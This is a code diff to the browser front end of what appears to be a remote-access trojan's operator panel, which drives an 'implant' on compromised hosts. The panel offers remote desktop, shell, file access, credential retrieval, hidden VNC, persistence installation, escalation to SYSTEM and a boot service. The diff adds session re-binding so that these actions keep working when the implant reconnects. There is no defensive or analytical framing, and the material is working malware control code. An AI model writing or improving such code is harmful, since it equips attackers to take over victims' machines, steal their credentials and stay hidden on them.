@@ -1,8 +1,27 @@
 "use strict";
 
 const root = document.getElementById("session-root");
-const sessionId = root.dataset.session;
+let sessionId = root.dataset.session;
+const sessionHost = root.dataset.host || "";
 const rdPort = location.port && location.port !== "443" ? `:${location.port}` : "";
+
+// The implant mints a new session id on every reconnect. If the id in the URL is
+// dead, rebind the drawer to the live session for the same host so every action
+// targets something that exists.
+async function resolveSession() {
+  try {
+    const resp = await fetch("/api/sessions");
+    const data = await resp.json();
+    const list = data.sessions || [];
+    if (!list.some((s) => s.id === sessionId)) {
+      const match = list.find((s) => s.host === sessionHost) || list[0];
+      if (match) sessionId = match.id;
+    }
+  } catch (err) {
+    /* offline: keep current id */
+  }
+  return sessionId;
+}
 
 function show(tab) {
   document.querySelectorAll("section.panel").forEach((el) => el.classList.add("hidden"));
@@ -28,7 +47,8 @@ function wsUrl(path) {
   return `${proto}//${location.host}${path}`;
 }
 
-function connectDesktop() {
+async function connectDesktop() {
+  await resolveSession();
   if (rdSocket && rdSocket.readyState <= 1) return;
   const canvas = document.getElementById("rd-canvas");
   const status = document.getElementById("rd-status");
@@ -38,6 +58,8 @@ function connectDesktop() {
   rdSocket.onopen = () => { status.textContent = "broker connected"; canvas.focus(); };
   rdSocket.onclose = () => { status.textContent = "helper not connected"; };
   rdSocket.ontext = null;
+  let gotFrame = false;
+  setTimeout(function () { if (!gotFrame) status.textContent = "no video — rd helper not connected (remote rd requires :8443 reachable from the target)"; }, 6000);
   rdSocket.onmessage = async (event) => {
     if (typeof event.data === "string") {
       try {
@@ -61,6 +83,7 @@ function connectDesktop() {
       } catch (err) { /* non-fatal */ }
       return;
     }
+    gotFrame = true;
     const bitmap = await createImageBitmap(event.data);
     canvas.width = bitmap.width;
     canvas.height = bitmap.height;
@@ -85,7 +108,8 @@ function connectDesktop() {
 }
 
 /* ---------------- shell ---------------- */
-function startShell() {
+async function startShell() {
+  await resolveSession();
   if (term || typeof Terminal === "undefined") return;
   term = new Terminal({ fontSize: 12, theme: { background: "#0d1117", foreground: "#c9d1d9" } });
   term.open(document.getElementById("term"));
@@ -99,6 +123,7 @@ function startShell() {
 
 /* ---------------- files ---------------- */
 async function listFiles(path) {
+  await resolveSession();
   document.getElementById("files-path").value = path;
   const resp = await fetch(`/api/${sessionId}/ls`, {
     method: "POST", headers: { "Content-Type": "application/json" },
@@ -146,6 +171,7 @@ document.getElementById("files-upload").addEventListener("change", async (ev) =>
 
 /* ---------------- procs ---------------- */
 async function listProcs() {
+  await resolveSession();
   const resp = await fetch(`/api/${sessionId}/ps`, { method: "POST" });
   const body = document.getElementById("procs-body");
   body.innerHTML = "";
@@ -174,6 +200,7 @@ document.getElementById("procs-refresh").addEventListener("click", listProcs);
 
 /* ---------------- info ---------------- */
 async function loadInfo() {
+  await resolveSession();
   const resp = await fetch(`/api/${sessionId}/info`);
   const data = await resp.json();
   document.getElementById("info-body").textContent = JSON.stringify(data, null, 2);
@@ -181,6 +208,7 @@ async function loadInfo() {
 
 /* ---------------- credentials ---------------- */
 async function loadCreds() {
+  await resolveSession();
   const resp = await fetch(`/api/${sessionId}/creds`);
   const body = document.getElementById("creds-body");
   body.innerHTML = "";
@@ -199,6 +227,7 @@ async function loadCreds() {
 
 /* ---------------- HVNC ---------------- */
 document.getElementById("hvnc-start").addEventListener("click", async () => {
+  await resolveSession();
   const status = document.getElementById("rd-status");
   status.textContent = "starting hidden desktop…";
   try {
@@ -213,6 +242,7 @@ document.getElementById("hvnc-start").addEventListener("click", async () => {
 });
 
 document.getElementById("persist").addEventListener("click", async () => {
+  await resolveSession();
   const status = document.getElementById("rd-status");
   status.textContent = "installing unattended persistence…";
   try {
@@ -229,6 +259,7 @@ document.getElementById("persist").addEventListener("click", async () => {
 });
 
 document.getElementById("getsystem").addEventListener("click", async () => {
+  await resolveSession();
   const status = document.getElementById("rd-status");
   status.textContent = "escalating to SYSTEM…";
   try {
@@ -245,6 +276,7 @@ document.getElementById("getsystem").addEventListener("click", async () => {
 });
 
 document.getElementById("service").addEventListener("click", async () => {
+  await resolveSession();
   const status = document.getElementById("rd-status");
   status.textContent = "installing boot service (SYSTEM)…";
   try {
